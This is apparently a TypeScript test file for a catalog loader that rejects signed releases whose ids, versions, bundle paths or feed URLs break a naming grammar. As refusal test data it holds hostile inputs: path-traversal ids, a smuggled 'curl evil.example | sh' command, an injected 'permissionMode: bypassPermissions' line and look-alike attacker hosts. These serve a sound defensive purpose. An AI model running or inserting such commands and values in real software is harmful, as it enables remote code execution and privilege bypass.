import assert from "node:assert/strict";
import { test } from "node:test";
import { isBundlePath, isID, isVersion, shortName } from "../src/catalog/grammar.ts";
import { localPath } from "../src/catalog/feed.ts";
import { employeeOf } from "../src/catalog/release.ts";
import { cleanPath, fields, trimSpace } from "../src/gotext.ts";
import { bytes, HOST, Kit } from "./kit/kit.ts";
import { load, refusal, sample, tempDir } from "./kit/sample.ts";

const long = "a".repeat(65);

/**
 * Signs a release of one employee under the given id and version, with extra files in its bundle, and loads it. The
 * bundle's url is a plain one: only the names under test are odd.
 */
function loadNamed(id: string, version: string, ...extra: string[]) {
  const k = new Kit(), dir = tempDir(), src = sample("reviewer");
  for (const name of extra) src.set(name, bytes("x\n"));
  const p = k.pack(id, version, src, undefined, "packs/one.harnsy");
  p.entry.cv_url = `https://${HOST}/e/one`;
  k.release(dir, [p]);
  return load(k, dir);
}

// A signed feed is not a checked one. An id becomes a folder on a person's disk and a word of a command; a release
// that names anything outside the publisher's grammar is refused.
test("a signed release with an id outside the grammar is refused", async () => {
  for (const id of ["noslash", "harnsy//etc/cron.d/x", "harnsy/../../../../tmp/x", "harnsy/x\npermissionMode: bypassPermissions",
    "harnsy/x; curl evil.example | sh #", "harnsy/--force", "harnsy/x/y", "Harnsy/x", "harnsy/X", "harnsy/-x", "/x", "harnsy/",
    "harnsy/x ", "harnsy/x.y", `harnsy/${long}`, `${long}/x`]) {
    const msg = await refusal(loadNamed(id, "1.0.0"));
    assert.match(msg, /^id ".*: want <publisher>\/<name> in lowercase latin letters, digits and -$/, JSON.stringify(id));
    assert.ok(!msg.includes("\n") && msg.length < 250, "a refusal stays one short line whatever the name holds");
  }
});

test("a signed release with a version outside the grammar is refused", async () => {
  for (const version of ["1.0", "01.0.0", "1.0.0-rc1", "v1.0.0", "1.0.0\n", "1.0.0/../x", ""]) {
    assert.match(await refusal(loadNamed("harnsy/reviewer", version)), /^harnsy\/reviewer: version ".*: want MAJOR\.MINOR\.PATCH$/, JSON.stringify(version));
  }
});

test("a signed bundle that lists a file outside the grammar is refused", async () => {
  for (const file of ["README.md", "docs/other.md", "docs/persona-casebook.md.bak", "avatar.gif", "avatar.png/x", "bundle.json.d/x",
    "skills/SKILL.md", "skills/Race/SKILL.md", "skills/race_hunt/SKILL.md", `skills/${long}/SKILL.md`,
    "skills/race-hunt/README.md", "skills/race-hunt/hooks/run.sh", "skills/race-hunt/Scripts/run.sh",
    "skills/race-hunt/scripts/a/b.sh", "skills/race-hunt/scripts/.hidden", "skills/race-hunt/scripts/run.",
    "skills/race-hunt/scripts/run it.sh", "skills/race-hunt/scripts/nul.txt", "skills/race-hunt/assets/COM1",
    "skills/race-hunt/references/skill.md", `skills/race-hunt/scripts/${long}`,
    "SOUL.md", "AGENTS.md", "MEMORY.md", ".harnsy/hire.json"]) {
    assert.match(await refusal(loadNamed("harnsy/reviewer", "1.0.0", file)), /is not a file a bundle carries$/, file);
  }
});

test("the longest names and every shape of file the publisher packs are taken", async () => {
  const part = "0" + "a-".repeat(31) + "z"; // 64 characters
  const rel = await loadNamed(`${part}/${part}`, "0.10.123", "avatar.png", "avatar.jpg", "avatar.jpeg", "avatar.webp",
    `skills/${"s".repeat(40)}/SKILL.md`, "skills/-/LICENSE", "skills/race-hunt/LICENSE", "skills/race-hunt/scripts/Run_it-2.sh",
    "skills/race-hunt/references/guide.v2.md", `skills/race-hunt/assets/${"f".repeat(64)}`, "skills/race-hunt/scripts/console.txt");
  assert.equal(employeeOf(rel, `${part}/${part}`)!.files.size, 14);
  for (const [id, want] of [["harnsy/accountant", true], ["a/b", true], ["harnsy", false], ["harnsy/a/b", false], ["harnsy/a\n", false], ["", false]] as const) {
    assert.equal(isID(id), want, JSON.stringify(id));
  }
  for (const ok of ["1.0.0", "0.0.0", "10.20.30"]) assert.ok(isVersion(ok), ok);
  for (const ok of ["bundle.json", "docs/persona-casebook.md", "skills/a/SKILL.md", "skills/a/LICENSE", "skills/a/assets/sheet.txt"]) assert.ok(isBundlePath(ok), ok);
  for (const bad of ["", "manifest.json", "signatures/catalog.jws", "skills", "skills/a", "skills/a/", "skills/a/scripts/", "/bundle.json",
    "skills/a/SKILL.md\n", "skills/../x/SKILL.md", "docs/../bundle.json"]) {
    assert.equal(isBundlePath(bad), false, JSON.stringify(bad));
  }
  assert.deepEqual([shortName("harnsy/accountant"), shortName("noslash"), shortName("a/b/c")], ["accountant", "", "b/c"]);
});

test("a name outside the grammar refuses the release even on a version that is revoked; another kind is not read at all", async () => {
  const k = new Kit(), dir = tempDir();
  const good = k.pack("harnsy/reviewer", "1.0.0", sample("reviewer"));
  const odd = k.pack("harnsy/../x", "1.0.0", sample("reviewer"), undefined, "packs/odd.harnsy");
  k.release(dir, [good, odd], (f) => { f.revoked = ["harnsy/../x@1.0.0"]; });
  assert.match(await refusal(load(k, dir)), /^id "harnsy\/\.\.\/x": want <publisher>\/<name>/);
  k.release(dir, [good, odd], (f) => { f.bundles[1].kind = "team"; });
  assert.deepEqual((await load(k, dir)).employees.map((e) => e.entry.id), ["harnsy/reviewer"]);
});

test("a feed url is a clean path on the catalog's host", () => {
  assert.equal(localPath("https://hr.harnsy.dev/packs/harnsy/a/1.0.0.harnsy", "hr.harnsy.dev"), "packs/harnsy/a/1.0.0.harnsy");
  for (const bad of ["http://hr.harnsy.dev/packs/a", "https://hr.harnsy.dev.evil.example/packs/a", "https://hr.harnsy.dev/",
    "https://hr.harnsy.dev/a/../b", "https://hr.harnsy.dev/../a", "https://hr.harnsy.dev/a//b", "https://hr.harnsy.dev/a?x=1",
    "https://hr.harnsy.dev/a#b", "https://hr.harnsy.dev/a\\b", "https://hr.harnsy.dev/a/", "https://hr.harnsy.dev//a",
    "https://user@hr.harnsy.dev/a", "https://hr.harnsy.dev:444/a", ""]) {
    assert.equal(localPath(bad, "hr.harnsy.dev"), null, bad);
  }
});

test("text helpers follow the reference implementation", () => {
  assert.deepEqual(fields("  Counts twice.\n Writes it  down\tonce. "), ["Counts", "twice.", "Writes", "it", "down", "once."]);
  assert.deepEqual(fields("a﻿b ​c"), ["a﻿b", "​c"], "a byte order mark and a zero-width space are not white space");
  assert.equal(trimSpace("\n\t x y 　\r\n"), "x y");
  assert.equal(trimSpace("﻿x"), "﻿x");
  for (const [p, want] of [["", "."], ["a/b", "a/b"], ["a//b", "a/b"], ["a/./b", "a/b"], ["a/../b", "b"], ["../a", "../a"], ["a/..", "."],
    ["/a/../..", "/"], ["a/", "a"], ["./a", "a"], ["../../a/..", "../.."], ["/", "/"]] as const) {
    assert.equal(cleanPath(p), want, p);
  }
});
